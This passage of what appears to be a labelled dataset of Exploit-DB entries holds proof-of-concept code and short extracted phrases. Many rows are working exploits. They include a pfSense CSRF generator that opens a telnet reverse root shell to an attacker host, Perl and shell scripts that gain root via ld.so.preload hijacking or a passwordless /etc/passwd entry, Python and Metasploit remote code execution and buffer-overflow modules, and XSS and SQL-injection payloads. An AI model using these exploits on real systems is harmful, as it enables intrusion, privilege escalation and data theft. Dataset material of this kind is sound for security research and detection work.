.'""><BODY></BODY></HTML>');      }      exit;  Result with a direct call to this page :  Fatal error: Call to undefined function upload_progress_meter_get_info() in /usr/local/www/progress.php on line 21    Proof of Concept 2 : ======================================================================  XSS non-persistent :  File /usr/local/www/pkg_mgr_install.php line 166 :       update_output_window(sprintf(gettext(""Could not find %s.""), $_GET['pkg']));  PoC :   http://pfsense_url/pkg_mgr_install.php?mode=installedinfo&pkg=x%22;alert(document.cookie);this.document.forms[0].output.value+=%22    Proof of Concept 3 : ======================================================================  CSRF exploit to Remote Command Execution in root context :  File /usr/local/www/system_firware.php line 118 (because this script isn't protected with CSRFMagic) :   if($_POST['kerneltype']) {      if($_POST['kerneltype'] == ""single"")        system(""touch /boot/kernel/pfsense_kernel.txt"");      else        system(""echo {$_POST['kerneltype']} > /boot/kernel/pfsense_kernel.txt""); // vulnerability here   }  It's the more dangerous vulnerability. By this way, it's possible to an attacker to gain a full interactive reverse shell through a CSRF attack.  Default valid command :   echo SMP > /boot/kernel/pfsense_kernel.txt  Forged $_POST['kerneltype'] variable for RCE command to generate :   SMP > /boot/kernel/pfsense_kernel.txt;telnet ATTACKER_IP 1337 | /bin/sh | telnet ATTACKER_IP 1338  Attacker need to put two netcat in listen mode on his computer :   nc -l -vv -p 1337 # to send command   nc -l -vv -p 1338 # to read results  You can see this exploitation in this demonstration video just made as proof of concept here:   http://www.youtube.com/watch?feature=player_embedded&v=qnmalMrrUF4  CSRF generator to Reverse root shell :  <html>   <head>     <script> function trim(s){   return s.replace(/\r\n|\r|\n|\t/g,'').replace(/^\s+/g,'').replace(/\s+$/g,''); }   function generateCSRF(){   var target = trim(document.getElementById(""target"").value);   var attacker = trim(document.getElementById(""attacker"").value);   var sendport = trim(document.getElementById(""sendport"").value);    var readport = trim(document.getElementById(""readport"").value);   var resultjs = """";   resultjs += ""<html><body><form name='x' action='"" + target + ""system_firmware.php' method='post'>"";   resultjs += ""<input type='hidden' name='kerneltype' value='SMP > /boot/kernel/pfsense_kernel.txt;telnet "" + attacker + "" "" + sendport + "" | /bin/sh | telnet "" + attacker + "" "" + readport + ""' />"";   resultjs += ""</form><script>document.forms['x'].submit();<\/script></body></html>"";   document.getElementById(""resultjs"").value = resultjs; }       </script>   </head>    <body onload=""generateCSRF();"">      <h2>CSRF pfSense 2.0.1 to root RCE (reverse shell)</h2>      <p>pfSense 2.0.1, the latest firewall/router distribution based on FreeBSD is vulnerable to a CSRF attack that allows gaining root access through a reverse shell.<br />  The attacker must know the URL address of pfsense WebGui.<br />  To obtain the reverseshell, attacker must place two netcat in listening mode on two different ports. One will be used to send commands and the other for receiving results.<br />  On attacker machine :        <pre>nc -l -vv -p 1337 # First netcat listener, to enter shell command.</pre>        <pre>nc -l -vv -p 1338 # Second netcat listener, to receive commands results.</pre>  (admin hash is in the /config/config.xml file on pfSense)      </p>  <form action="""" onsubmit=""generateCSRF();return false;"">    <table>      <tr><td>URL's pfSense 2.0.1 Targeted :</td> <td>        <input id=""target"" type=""text"" value=""http://192.168.0.254:80/"" size=""70"" onkeyup=""generateCSRF();"" /></td>      </tr>      <tr><td>Attacker IP (reverse shell) :</td> <td>        <input id=""attacker"" type=""text"" value=""192.168.0.141"" size=""70"" onkeyup=""generateCSRF();"" /></td>      </tr>      <tr><td>Attacker binded port to send commands :</td> <td>        <input id=""sendport"" type=""text"" value=""1337"" size=""70"" onkeyup=""generateCSRF();"" /></td>      </tr>      <tr><td>Attacker binded port to read results :</td> <td>        <input id=""readport"" type=""text"" value=""1338"" size=""70"" onkeyup=""generateCSRF();"" /></td>      </tr>       <tr> <td>CSRF exploit to send to an admin : </td> <td>       <textarea cols=""70"" rows=""10"" id=""resultjs"" readonly=""readonly"">&lt;/textarea&gt; </td>      </tr>    </table>  </form>  </body> </html>   Solution: ====================================================================== 2012-12-21:  Release 2.0.2     Additional resources : ======================================================================  - www.pfsense.org - www.synetis.com - www.synetis.com/2012/11/12/contribution-au-pare-feu-routeur-pfsense - www.asafety.fr/vuln-exploit-poc/xss-csrf-rce-pfsense-2-0-1-remote-root-access - www.youtube.com/watch?feature=player_embedded&v=qnmalMrrUF4 - github.com/bsdperimeter/pfsense/commit/73b9d3c60a337ab0fe979958990a717288844ddd - github.com/bsdperimeter/pfsense/commit/33ba41314b5e78c16562365826aef9118f370e46    Report timeline : ======================================================================  2012-10-02 : Team alerted with many details, PoC, video and potential solution 2012-10-04 : Team response with correction links into git repository 2012-10-05 : Our feedback concerning their corrections 2012-12-10 : Answer about the next release date of the 2.0.2 (no response) 2012-12-21 : Release 2.0.2 2013-01-04 : Public advisory    Credits : ======================================================================      88888888    88      888                                         88    88   888       88                                         88   788           Z88      88  88.888888     8888888   888888  88    8888888.    888888.       88     88   888    Z88   88     88    88    88   88     88        8888888    88    88   88      88  88       88   88    88   888             888   88   88    88      88  88888888888   88    88     888888   88         88    88  8.    88      88  88            88    88          888   888       ,88     8I88     88      88   88      88   88    88  .88     .88    ?8888888888.     888      88      88    88888888    8888  88   =88888888        888.          88                     88    www.synetis.com                  8888  Consulting firm in management and information security  Yann CAM - Security Consultant @ synetis    Last word : ======================================================================  Thank you to all the pfSense team for professionalism and quality solution despite of these few minor weaknesses.  --  SYNETIS CONTACT: www.synetis.com",place two netcat in listening mode on two different ports,1
17339,"HP Data Protector Client 6.11 - 'EXEC_CMD' Remote Code Execution # Exploit Title: HP Data Protector Client EXEC_CMD Remote Code Execution Vulnerability PoC (ZDI-11-055) # Date: 2011-05-28 # Author: @fdiskyou # e-mail: rui at deniable.org # Version: 6.11 # Tested on: Windows 2003 Server SP2 en # CVE: CVE-2011-0923 # Notes: ZDI-11-055 # Reference: http://www.zerodayinitiative.com/advisories/ZDI-11-055/ # Reference: http://h20000.www2.hp.com/bizsupport/TechSupport/Document.jsp?objectID=c02781143 # # Greetz to all the Exploit-DB Dev Team.  import socket import sys  if len(sys.argv) != 3:     print ""Usage: ./ZDI-11-055.py <Target IP> <Port>""     sys.exit(1)  host = sys.argv[1] port = int(sys.argv[2])  # The following PoC takes advantage of a Directory Path Traversal to execute ipconfig.exe on the remote host.  # Tweak payload to better suit your needs. payload = ( ""\x00\x00\x00\xa4\x20\x32\x00\x20\x66\x64\x69\x73\x6b\x79\x6f\x75"" ""\x00\x20\x30\x00\x20\x53\x59\x53\x54\x45\x4d\x00\x20\x66\x64\x69"" ""\x73\x6b\x79\x6f\x75\x00\x20\x43\x00\x20\x32\x30\x00\x20\x66\x64"" ""\x69\x73\x6b\x79\x6f\x75\x00\x20\x50\x6f\x63\x00\x20\x4e\x54\x41"" ""\x55\x54\x48\x4f\x52\x49\x54\x59\x00\x20\x4e\x54\x41\x55\x54\x48"" ""\x4f\x52\x49\x54\x59\x00\x20\x4e\x54\x41\x55\x54\x48\x4f\x52\x49"" ""\x54\x59\x00\x20\x30\x00\x20\x30\x00\x20\x2e\x2e\x2f\x2e\x2e\x2f"" ""\x2e\x2e\x2f\x2e\x2e\x2f\x2e\x2e\x2f\x2e\x2e\x2f\x2e\x2e\x2f\x2e"" ""\x2e\x2f\x2e\x2e\x2f\x2e\x2e\x2f\x5c\x77\x69\x6e\x64\x6f\x77\x73"" ""\x5c\x73\x79\x73\x74\x65\x6d\x33\x32\x5c\x69\x70\x63\x6f\x6e\x66"" ""\x69\x67\x2e\x65\x78\x65\x00\x00"")  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.connect((host, port)) print ""Sending payload"" s.send(payload)  while 1:         data = s.recv(4096)         if data:                 print data         else:                 break  s.close()",Directory Path Traversal,0
33755,"PHP 5.3.2 'xmlrpc' Extension - Multiple Remote Denial of Service Vulnerabilities source: https://www.securityfocus.com/bid/38708/info  PHP's xmlrpc extension library is prone to multiple denial-of-service vulnerabilities because it fails to properly handle crafted XML-RPC requests.  Exploiting these issues allows remote attackers to cause denial-of-service conditions in the context of an application using the vulnerable library.  PHP 5.3.1 is vulnerable; other versions may also be affected.   <?php $req = '<?xml version=""1.0""?> <methodCall>    </methodCall>';     $result = xmlrpc_decode_request( $req, $frop ); ?>",crafted XML-RPC requests,1
41620,"Cerberus FTP Server 8.0.10.3 - 'MLST' Buffer Overflow (PoC) [+] Title: Cerberus FTP Server 8.0.10.3 – 'MLST' Remote Buffer Overflow [+] Credits / Discovery: Nassim Asrir [+] Author Contact: wassline@gmail.com || https://www.linkedin.com/in/nassim-asrir-b73a57122/ [+] Author Company: Henceforth [+] CVE: CVE-2017-6880  Vendor: ===============  https://www.cerberusftp.com/      Download: ===========  https://www.cerberusftp.com/files/CerberusInstall.exe (32-Bit)     Vulnerability Type: ===================  Remote Buffer Overflow.   issue: ===================  This problem happens when the Attacker send the bad char ""A"" in the command ""MLST"" (2047).   POC: =================== #Simple POC by Nassim Asrir from Henceforth. import socket bad_char = ""A""*2047 s=socket.socket(socket.AF_INET,socket.SOCK_STREAM) connect=s.connect(('192.168.1.81',21)) s.recv(1024) s.send('USER nassim\r\n') s.recv(1024) s.send('PASS mypass\r\n') s.recv(1024) s.send('MLST ' + bad_char + '\r\n') s.close()  https://gist.github.com/Nassim-Asrir/a1bb8479976d4bf6b7c0e63024a46cd6/archive/e76274496bf20a0d3ecbb4b2f6a408166808d03b.zip   Tested on: ===============   Windows 7 Sp1 (64 Bit)","send the bad char ""A"" in the command ""MLST"" (2047)",1
21956,"KMMail 1.0 - E-Mail HTML Injection source: https://www.securityfocus.com/bid/6013/info  kmMail does not sufficiently sanitize HTML and script code from the body of e-mail messages. As a result, an attacker may send a malicious message to a user of kmMail that includes arbitrary HTML and script code.  This may allow an attacker to steal cookie-based authentication credentials from users of the webmail system. Other attacks are also possible.  <b onMouseOver=""alert(document.location)"">bolder</b>",send a malicious message to a user of kmMail that includes arbitrary HTML and script code,1
30788,"IcoFX - Local Stack Buffer Overflow (Metasploit) ## # This module requires Metasploit: http//metasploit.com/download # Current source: https://github.com/rapid7/metasploit-framework ##  require 'msf/core'   class Metasploit3 < Msf::Exploit::Remote   Rank = NormalRanking    include Msf::Exploit::FILEFORMAT    def initialize(info = {})     super(update_info(info,       'Name'           => 'IcoFX Stack Buffer Overflow',       'Description'    => %q{         This module exploits a stack-based buffer overflow vulnerability in version 2.1         of IcoFX. The vulnerability exists while parsing .ICO files, where an specially         crafted ICONDIR header, providing an arbitrary long number of images into the file,         can be used to trigger the overflow when reading the ICONDIRENTRY structures.       },       'License'        => MSF_LICENSE,       'Author'         =>         [           'Marcos Accossatto', # Vulnerability discovery, poc           'juan vazquez' # Metasploit         ],       'References'     =>         [           [ 'CVE', '2013-4988' ],           [ 'OSVDB', '100826' ],           [ 'BID', '64221' ],           [ 'EDB', '30208'],           [ 'URL', 'http://www.coresecurity.com/advisories/icofx-buffer-overflow-vulnerability' ]         ],       'Platform'          => [ 'win' ],       'Payload'           =>         {           'DisableNops'    => true,           'Space'          => 864,           'PrependEncoder' => ""\x81\xc4\x54\xf2\xff\xff"" # Stack adjustment # add esp, -3500         },       'Targets'        =>         [           [ 'IcoFX 2.5 / Windows 7 SP1',             {               :callback => :target_win7,             }           ],         ],       'DisclosureDate' => 'Dec 10 2013',       'DefaultTarget'  => 0))      register_options(       [         OptString.new('FILENAME', [ true, 'The output file name.', 'msf.ico'])       ], self.class)    end    def target_win7     # All the gadgets com from IcoFX2.exe 2.5.0.0      # ICONDIR structure     ico =  [0].pack(""v"") # Reserved. Must always be 0     ico << [1].pack(""v"") # Image type: 1 for icon (.ico) image     # 0x66 is enough to overwrite the local variables and, finally     # the seh handler. 0x7f00 is used to trigger an exception after     # the overflow, while the overwritten SEH handler is in use.     ico << [0x7f00].pack(""v"")     # ICONDIRENTRY structures 102 structures are using to overwrite     # every structure = 16 bytes     # 100 structures are used to reach the local variables     ico << rand_text(652)     ico << [0x0044729d].pack(""V"") * 20 # ret # rop nops are used to allow code execution with the different opening methods     ico << [0x0045cc21].pack(""V"")      # jmp esp     ico << payload.encoded     ico << rand_text(       1600 -                 # 1600 = 16 ICONDIRENTRY struct size * 100       652 -                  # padding to align the stack pivot       80 -                   # rop nops size       4 -                    # jmp esp pointer size       payload.encoded.length     )     # The next ICONDIRENTRY allows to overwrite the interesting local variables     # on the stack     ico << [2].pack(""V"")          # Counter (remaining bytes) saved on the stack     ico << rand_text(8)           # Padding     ico << [0xfffffffe].pack(""V"") # Index to the dst buffer saved on the stack, allows to point to the SEH handler     # The next ICONDIRENTRY allows to overwrite the seh handler     ico << [0x00447296].pack(""V"") # Stackpivot: add esp, 0x800 # pop ebx # ret     ico << rand_text(0xc) # padding     return ico   end    def exploit     unless self.respond_to?(target[:callback])       fail_with(Failure::BadConfig, ""Invalid target specified: no callback function defined"")     end      ico = self.send(target[:callback])      print_status(""Creating '#{datastore['FILENAME']}' file..."")     file_create(ico)   end  end","an specially crafted ICONDIR header, providing an arbitrary long number of images into the file",1
19979,"KDE 1.1.2 KApplication configfile - Local Privilege Escalation (1) #source: https://www.securityfocus.com/bid/1291/info # #The KDE configuration-file management has a bug which could result in root compromise. # #Due to insecure creation of configuration (rc) files via KApplication-class, local users can modify ownership of arbitrary files when running setuid root KDE-programs. # #Properly exploited, this can permit a local attacker to change ownership of key system files, then write arbitrary data to them, allowing an elevation of privileges.  #!/usr/bin/perl  # # 7350ktvision! The ktvision-hack.  # # Just execute. Gives instant rootshell kiddie! # If only ktvision is setuid-root and vulnerable as with # SuSE 6.4! # # # Bugdiscovery is due to Sebastian Krahmer. # http://www.cs.uni-potsdam.de/homepages/students/linuxer # # Greets as always to TESO, security.is, lam3rz ... you all # know who you are. # # Special greets to that beautiful black-dressed woman at # the bus stop. This one is for you. :) #   my $rcfile = $ENV{""HOME""}.""/.kde/share/config/ktvisionrc"";  $ENV{""PATH""}.="":/opt/kde/bin"";  print "">>Get a feeling on GUI's and how secure they are.<< Stealth.\n"";  print ""Creating hijack-lib ...\n""; open O, "">/tmp/boom.c"" or die ""open(boom.c..)""; print O<<_EOF_; #include <sys/types.h>  int time(void *v) { 	chown(""/tmp/boomsh"", 0, 0); 	chmod(""/tmp/boomsh"", 06755); 	unlink(""/etc/ld.so.preload""); 	exit(1); } _EOF_ close O;  print ""Compiling hijack-lib ...\n""; `cc -c -fPIC /tmp/boom.c -o /tmp/boom.o`; `cc -shared /tmp/boom.o -o /tmp/boom.so`;  open O, "">/tmp/boomsh.c"" or die ""open(boomsh.c ...)""; print O<<_EOF2_; #include <stdio.h> int main()  {     char *a[] = {""/bin/sh"", 0};     setuid(0); setregid(0, 0);     execve(a[0], a, 0);     return 0; } _EOF2_ close O;  print ""Compile shell ...\n""; `cc /tmp/boomsh.c -o /tmp/boomsh`;  umask 0;  unlink $rcfile; symlink ""/etc/ld.so.preload"", $rcfile;  print ""Invoking vulnerable program (ktvision)...\n"";  if (fork() == 0) { 	`ktvision`; 	exit 0; } else { 	sleep(3); 	kill 9, `pidof ktvision`; }  open O, "">/etc/ld.so.preload"" or die ""Huh? Can't open preload.""; print O ""/tmp/boom.so""; close O; `/usr/bin/passwd`;  # let it look like if we have sth. to do. :) sleep 3; print ""Welcome. But as always: BEHAVE!\n""; system(""/tmp/boomsh"");",KApplicationclass,0
37531,"Grandstream GXV3275 < 1.0.3.30 - Multiple Vulnerabilities The Grandstream GXV3275 is an Android-based VoIP phone. Several vulnerabilities were found affecting this device.  * The device ships with a default root SSH key, which could be used as a backdoor:  /system/root/.ssh # cat authorized_keys Public key portion is: ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAAAgwCIcYbgmdHTpTeDcBA4IOg5Z7d2By0GXGihZzcTxZC+YTWGUe/HJc+pYDpDrGMWg0hMqd+JPs1GaLNw4pw0Mip6VMT7VjoZ8Z+n2ULNyK1IoTU4C3Ea4vcYVR8804Pvh9vXxC0iuMEr1Jx7SewUwSlABX04uVpEObgnUhpi+hn/H34/ jhzhao@jhzhao-Lenovo Fingerprint: md5 7b:6e:a0:00:19:54:a6:39:84:1f:f9:18:2e:79:61:b5  This issue has not been resolved.  * The SSH interface only provides access to a limited CLI. The CLI's ping and traceroute commands will pass user input as parameters to underlying system commands without escaping shell metacharacters. This can be exploited to break out to a shell:  GXV3275 > traceroute $(sh)  This shell will only see stderr, so we then need to run sh with stdout redirected to stderr:  sh 1>&2  This issue has been resolved in firmware version 1.0.3.30.  * The web interface exposes an undocumented command execution API:   http://DEVICEIP/manager?action=execcmd&command=echo%20%22hello%22%20%3E%20/system/root/test.txt  This issue has been resolved in firmware version 1.0.3.30.  * The web interface allows unprivileged users to escalate privileges by modifying a cookie on the client side:  javascript:void(document.cookie=""type=admin"")  Full details are available here:  http://davidjorm.blogspot.com/2015/07/101-ways-to-pwn-phone.html  MITRE was contacted repeatedly requesting CVE names for these issues, but never replied.  David",modifying a cookie on the client side,1
40230,"SAP SAPCAR - Multiple Vulnerabilities 1. Advisory Information  Title: SAP CAR Multiple Vulnerabilities Advisory ID: CORE-2016-0006 Advisory URL: http://www.coresecurity.com/advisories/sap-car-multiple-vulnerabilities Date published: 2016-08-09 Date of last update: 2016-08-09 Vendors contacted: SAP Release mode: Coordinated release  2. Vulnerability Information  Class: Unchecked Return Value [CWE-252], TOCTOU Race Condition [CWE-367] Impact: Denial of service, Security bypass Remotely Exploitable: No Locally Exploitable: Yes CVE Name: CVE-2016-5845, CVE-2016-5847  3. Vulnerability Description  SAP [1] distributes software and packages using an archive program called SAPCAR. This program uses a custom archive file format. Vulnerabilities were found in the extraction of specially crafted archive files, that could lead to local denial of service conditions or privilege escalation.  4. Vulnerable Packages  SAPCAR archive tool Other products and versions might be affected, but they were not tested.  5. Vendor Information, Solutions and Workarounds  SAP published the following Security Notes:  2312905 2327384  6. Credits  This vulnerability was discovered and researched by Martin Gallo from Core Security Consulting Services. The publication of this advisory was coordinated by Joaquin Rodriguez Varela from Core Advisories Team.  7. Technical Description / Proof of Concept Code  SAP distributes software and packages using an archive program called SAPCAR. This program uses a custom archive file format. Vulnerabilities were found in the extraction of specially crafted archive files, that could lead to denial of service conditions or escalation of privileges.  The code that handles the extraction of archive files is prone to privilege escalation and denial of service vulnerabilities.  7.1. Denial of service via invalid file names  [CVE-2016-5845] Denial of service vulnerability due the SAPCAR program not checking the return value of file operations when extracting files. This might result in the program crashing when trying to extract files from an specially crafted archive file that contains invalid file names for the target platform. Of special interest are applications or solutions that makes use of SAPCAR in an automated way.  The following is a proof of concept to demonstrate the vulnerability:            $ xxd SAPCAR_crash.SAR          0000000: 4341 5220 322e 3031 4452 0081 0000 0f00  CAR 2.01DR......         0000010: 0000 0000 0000 0000 0000 d4f8 e555 0000  .............U..         0000020: 0000 0000 0000 0000 1000 696e 7075 742d  ..........input-         0000030: 6469 722f 696e 7090 7400 4544 1a00 0000  dir/inp.t.ED....         0000040: 0f00 0000 121f 9d02 7bc1 23b9 a90a 25a9  ........{.#...%.         0000050: 1525 0a69 9939 a95c 0000 857f b95a       .%.i.9.\.....Z                  $ ./SAPCAR -dvf SAPCAR_crash.SAR         SAPCAR: processing archive SAPCAR_crash.SAR (version 2.01)         d input-dir/inp#t         SAPCAR: checksum error in input-dir/inp#t (error 12). No such file or director                  $ ./SAPCAR -xvf SAPCAR_crash.SAR         SAPCAR: processing archive SAPCAR_crash.SAR (version 2.01)         x input-dir/inp#t         Segmentation fault   7.2. Race condition on permission change  [CVE-2016-5847] Race condition vulnerability due to the way the SAPCAR program change the permissions of extracted files. If a malicious local user has access to a directory where a user is extracting files using SAPCAR, the attacker might use this vulnerability to change the permissions of arbitrary files belonging to the user.  The SAPCAR program writes the file being extracted and after closing it, the program changes the permissions to the ones set on the archive file. There's a time gap between the creating of the file and the change of the permissions. During this time frame, a malicious local user can replace the extracted file with a hard link to a file belonging to another user, resulting in the SAPCAR program changing the permissions on the hard-linked file to be the same as that of the compressed file.  The following is a proof of concept to demonstrate the vulnerability:          $ xxd SAPCAR_race_condition.SAR       0000000: 4341 5220 322e 3031 5247 b481 0000 2b00  CAR 2.01RG....+.       0000010: 0000 0000 0000 0000 0000 d023 5e56 0000  ...........#^V..       0000020: 0000 0000 0000 0000 1000 7465 7374 5f73  ..........test_s       0000030: 7472 696e 672e 7478 7400 4544 3500 0000  tring.txt.ED5...       0000040: 2b00 0000 121f 9d02 7b21 19a9 0a85 a599  +.......{!......       0000050: c9d9 0a49 45f9 e579 0a69 f915 0a59 a5b9  ...IE..y.i...Y..       0000060: 05c5 0af9 65a9 450a 2540 e99c c4aa 4a85  ....e.E.%@....J.       0000070: 94fc 7400 0008 08c6 b9                   ..t......              $ ./SAPCAR -tvf SAPCAR_race_condition.SAR        SAPCAR: processing archive SAPCAR_race_condition.SAR (version 2.01)       -rw-rw-r--          43    01 Dec 2015 19:48 test_string.txt              $ strace ./SAPCAR -xvf SAPCAR_race_condition.SAR        execve(""./SAPCAR"", [""./SAPCAR"", ""-xvf"", ""SAPCAR_race_condition.SAR""], [/* 76 vars */]) = 0       [..]       open(""test_string.txt"", O_WRONLY|O_CREAT|O_TRUNC, 0666) = 4       mmap(NULL, 323584, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x7f98c4704000       fstat(4, {st_mode=S_IFREG|0664, st_size=0, ...}) = 0       mmap(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x7f98c475c000       write(4, ""The quick brown fox jumps over t""..., 43) = 43       close(4)                                = 0       munmap(0x7f98c475c000, 4096)            = 0       utime(""test_string.txt"", [2015/12/01-19:48:48, 2015/12/01-19:48:48]) = 0       chmod(""test_string.txt"", 0664)          = 0       [..]         8. Report Timeline  2016-04-21: Core Security sent an initial notification to SAP. 2016-04-22: SAP confirmed the reception of the email and requested the draft version of the advisory. 2016-04-22: Core Security sent SAP a draft version of the advisory and informed them we would adjust our publication schedule according with the release of a solution to the issues. 2016-04-25: SAP confirmed the reported vulnerabilities and assigned the following security incident tickets IDs: 1670264798, 1670264799 and 1670264800. 2016-05-10: Core Security asked SAP if they had a tentative date for publishing the security fixes. 2016-05-20: SAP informed Core Security they have a tentative release date on July 12th, 2016 (July Patch day). 2016-05-23: Core Security thanked SAP for the tentative date and informed them we would publish our security advisory accordingly upon their confirmation. 2016-06-27: Core Security requested SAP the tentative security notes numbers and links in order to add them to our security advisory. 2016-07-05: SAP informed Core Security they due to some issues found during their testing phase of the patches they were not in a position to ship the patches as part of their July patch day. They said they would be able to ship the patches with August patch day. 2016-07-06: Core Security requested SAP the specific day in August they planed to release the patches. 2016-07-20: Core Security requested again SAP the specific day in August they planed to release the patches. 2016-07-21: SAP informed Core Security they would publish their security notes on the 9th of August. 2016-08-10: Advisory CORE-2016-0006 published. 9. References  [1] http://go.sap.com/.   10. About CoreLabs  CoreLabs, the research center of Core Security, is charged with anticipating the future needs and requirements for information security technologies. We conduct our research in several important areas of computer security including system vulnerabilities, cyber attack planning and simulation, source code auditing, and cryptography. Our results include problem formalization, identification of vulnerabilities, novel solutions and prototypes for new technologies. CoreLabs regularly publishes security advisories, technical papers, project information and shared software tools for public use at: http://corelabs.coresecurity.com.  11. About Core Security  Courion and Core Security have rebranded the combined company, changing its name to Core Security, to reflect the company’s strong commitment to providing enterprises with market-leading, threat-aware, identity, access and vulnerability management solutions that enable actionable intelligence and context needed to manage security risks across the enterprise. Core Security’s analytics-driven approach to security enables customers to manage access and identify vulnerabilities, in order to minimize risks and maintain continuous compliance. Solutions include Multi-Factor Authentication, Provisioning, Identity Governance and Administration (IGA), Identity and Access Intelligence (IAI), and Vulnerability Management (VM). The combination of these solutions provides context and shared intelligence through analytics, giving customers a more comprehensive view of their security posture so they can make more informed, prioritized, and better security remediation decisions.  Core Security is headquartered in the USA with offices and operations in South America, Europe, Middle East and Asia. To learn more, contact Core Security at (678) 304-4500 or info@coresecurity.com.  12. Disclaimer  The contents of this advisory are copyright (c) 2016 Core Security and (c) 2016 CoreLabs, and are licensed under a Creative Commons Attribution Non-Commercial Share-Alike 3.0 (United States) License: http://creativecommons.org/licenses/by-nc-sa/3.0/us/  13. PGP/GPG Keys  This advisory has been signed with the GPG key of Core Security advisories team, which is available for download at http://www.coresecurity.com/files/attachments/core_security_advisories.asc.",specially crafted archive files,1
28573,"DCP-Portal 6.0 - 'login.php?Username' SQL Injection source: https://www.securityfocus.com/bid/20024/info    DCP-Portal is prone to multiple input-validation vulnerabilities, including multiple cross-site scripting, SQL-injection, and remote file-include issues, because the application fails to sanitize user-supplied input.     A successful exploit of these vulnerabilities could allow an attacker to compromise the application, access or modify data, steal cookie-based authentication credentials, exploit vulnerabilities in the underlying database implementation, or include an arbitrary remote file containing malicious PHP code and execute it in the context of the webserver process. Other attacks are also possible.    Version 6.0 Standard Edition is vulnerable to these issues; other versions may also be affected.  login try the user name as ' or uid=1/*",malicious PHP code,1
17498,"Freefloat FTP Server - Remote Buffer Overflow (Metasploit) ## # This file is part of the Metasploit Framework and may be subject to # redistribution and commercial restrictions. Please see the Metasploit # Framework web site for more information on licensing and terms of use. # http://metasploit.com/framework/ ##  require 'msf/core'  class Metasploit3 < Msf::Exploit::Remote 	Rank = AverageRanking  	include Msf::Exploit::Remote::Ftp  	def initialize(info = {}) 		super(update_info(info, 			'Name'           => 'Freefloat FTP Server Username Stack Overflow', 			'Description'    => %q{ 					This module exploits a buffer overflow found in the USER command of the Freefloat FTP server. 			}, 			'Author'         => [ 						'0v3r',		# Initial Discovery 						'James Fitts'	# Metasploit Module 					], 			'License'        => MSF_LICENSE, 			'Version'        => '$Revision: $', 			'References'     => 				[ 					[ 'URL', 'http://www.exploit-db.com/exploits/15689' ], 				], 			'DefaultOptions' => 				{ 					'EXITFUNC' => 'process', 				}, 			'Payload'        => 				{ 					'BadChars' => ""\x00\x0a\x0d"", 				}, 			'Platform'       => 'win', 			'Targets'        => 				[ 					[ 'Windows XP SP3', { 'Ret' => 0x77def069 } ], # jmp esp from ADVAPI32.dll 				], 			'DisclosureDate' => 'Dec 05 2010', 			'DefaultTarget'	=> 0)) 	end  	def exploit 		connect  		print_status(""Trying target #{target.name}..."")  		buf = make_nops(230) + [target.ret].pack('V') 		buf << make_nops(50) 		buf << payload.encoded  		send_cmd( ['USER', buf] , false )  		handler 		disconnect 	end  end",a malicious backdoor,1
17965,"OPC Systems.NET 4.00.0048 - Denial of Service #######################################################################                               Luigi Auriemma  Application:  OPC Systems.NET               http://www.opcsystems.com/opc_systems_net.htm Versions:     <= 4.00.0048 Platforms:    Windows Bug:          Denial of Service Exploitation: remote Date:         10 Oct 2011 Author:       Luigi Auriemma               e-mail: aluigi@autistici.org               web:    aluigi.org   #######################################################################   1) Introduction 2) Bug 3) The Code 4) Fix   #######################################################################  =============== 1) Introduction ===============   From vendor's website: ""As a Service Oriented Architecture the OPC Systems Service can connect to data from OPC Servers, OPC Clients, Visual Studio Applications, Microsoft Excel, and databases ... breakthrough .NET products for SCADA, HMI, and plant floor to business solutions to shorten your development to deployment time.""   #######################################################################  ====== 2) Bug ======   OPCSystemsService.exe can be freezed with CPU at 100% through a malformed .NET RPC packet. No additional research performed.   #######################################################################  =========== 3) The Code ===========   http://aluigi.org/testz/udpsz.zip https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/17965.zip    udpsz -l 2000 -c "".NET\1\0\0\0\0\0\xff\xff\xff\xff\4\0\1\1\x25\0\0\0tcp://127.0.0.1/OPC Systems Interface\6\0\1\1"" -T SERVER 58723 0x80   #######################################################################  ====== 4) Fix ======   No fix.   #######################################################################",some malformed fields,1
21356,"LogWatch 2.1.1/2.5 - Insecure Temporary Directory Creation source: https://www.securityfocus.com/bid/4374/info  LogWatch is a freely available, open source script for monitoring log files. It may be used with the Linux and Unix Operating systems.  Upon execution, LogWatch creates a directory in /tmp. This directory uses the name logwatch.$pid, where $pid is the process id of the executing script. The LogWatch script does not check for an already existing directory or contents of the already existing directory. It is therefore possible for a local user to create a malicious logwatch.$pid directory using predicted process IDs, and place malicious files in the directory which will be executed.   cat > logwatch211.sh <<EOF  #!/bin/bash # # March 27 2002 # # logwatch211.sh # # Proof of concept exploit code # for LogWatch 2.1.1 # Waits for LogWatch to be run then gives root shell # For educational purposes only # # (c) Spybreak <spybreak@host.sk>   SERVANT=""00-logwatch"" # Logwatch's cron entry SCRIPTDIR=/etc/log.d/scripts/logfiles/samba/  echo echo ""LogWatch 2.1.1 root shell exploit"" echo '(c) Spybreak <spybreak@host.sk>' echo echo ""Waiting for LogWatch to be executed""  while :; do   set `ps -o pid -C $SERVANT`     if [ -n ""$2"" ]; then       mkdir /tmp/logwatch.$2       ln -s $SCRIPTDIR'`cd etc;chmod 666 passwd #`' /tmp/logwatch.$2/cron       break;     fi done echo ""Waiting for LogWatch to finish it's work"" while :; do   set `ps -o pid -C $SERVANT`     if [ -z ""$2"" ]; then       ls -l /etc/passwd|mail root       echo master::0:0:master:/root:/bin/bash >> /etc/passwd       break;     fi done su master  EOF","create a malicious logwatch.$pid directory using predicted process IDs,",1
6154,"ViArt Shop 3.5 - 'category_id' SQL Injection ########################################################## # GulfTech Security Research                July 28, 2008 ########################################################## # Vendor : ViArt, Ltd # URL : http://www.viart.com/ # Version : ViArt Shop <= 3.5 # Risk : SQL Injection ##########################################################   Description: ViArt Shop is a full featured online ecommerce solution written in php. There is a high risk SQL Injection in ViArt that allows for an attacker to take over the ViArt installation. This vulnerability is present regardless of magic_quotes configuration. An updated version of ViArt has been released and all users are encouraged to upgrade their ViArt installation as soon as possible.   SQL Injection: There is a high risk SQL Injection vulnerability in ViArt that allows for an attacker to run arbitrary queries via a malicious request. The vulnerable code can be found in ""products_rss.php"". As seen below the ""$category_id"" variable is never sanitized within the query, and is never sanitized prior to that point either.  if ($category_id == 0){     $sql = ""SELECT category_id, friendly_url FROM "" . $table_prefix . ""categories WHERE category_path like 